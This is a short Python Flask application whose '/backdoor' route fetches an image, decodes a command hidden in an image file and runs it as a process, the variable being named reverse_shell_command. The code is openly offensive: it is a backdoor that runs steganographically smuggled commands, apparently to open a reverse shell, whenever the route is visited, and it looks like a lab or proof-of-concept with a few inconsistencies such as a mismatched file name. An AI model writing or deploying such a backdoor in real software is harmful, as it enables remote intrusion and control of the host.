from flask import Flask, send_file, redirect, url_for, request, render_template, render_template_string
import subprocess
from decode import decode
app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/image.png')
def function():
    return send_file('image.png', mimetype='image/png')

@app.route('/backdoor')
def serve_image():
    

    
    image_url = 'http://localhost:5000/image.png'
    image_path = 'image.png'
    subprocess.Popen(['wget', image_url, '-O', image_path])

    
    text = decode('imagee.png')
    reverse_shell_command = text
    print("Decoded command:", reverse_shell_command)
    
    
    subprocess.Popen(reverse_shell_command.split())

    
    send_file(image_path, mimetype='image/png')
    return render_template('page.html')

    

if __name__ == '__main__':
    app.run()
